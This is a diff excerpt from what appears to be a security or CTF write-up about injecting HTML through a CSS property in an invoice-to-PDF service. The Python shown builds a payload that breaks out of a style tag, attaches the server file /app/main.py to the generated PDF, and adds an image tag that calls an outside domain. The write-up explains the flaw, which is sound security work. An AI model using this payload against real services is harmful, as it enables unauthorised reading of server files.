@@ -869,7 +869,7 @@ And through only one attribute I was able to inject HTML: CSS property! But the 
 
 ```python
 
-invoice = {"companyName":"", "email":"", "invoiceNumber":"1", "date":"html", "<":">", "items":[["1","manoelt","manoelt","2"],["1","manoelt","manoelt","2"]],"styles":{"body":{"}</style//<link rel='attachment' href='file:///app/main.py'><style> body: {  background-color":"white"}}}
+invoice = {"companyName":"", "email":"", "invoiceNumber":"1", "date":"html", "<":">", "items":[["1","manoelt","manoelt","2"],["1","manoelt","manoelt","2"]],"styles":{"body":{"}</style//<img src='http://mydomain.com.br'><link rel='attachment' href='file:///app/main.py'><style> body: {  background-color":"white"}}}
 payload = {"d" : json.dumps(invoice)}
 pdfize(payload, "style_invoice.pdf")
 ```
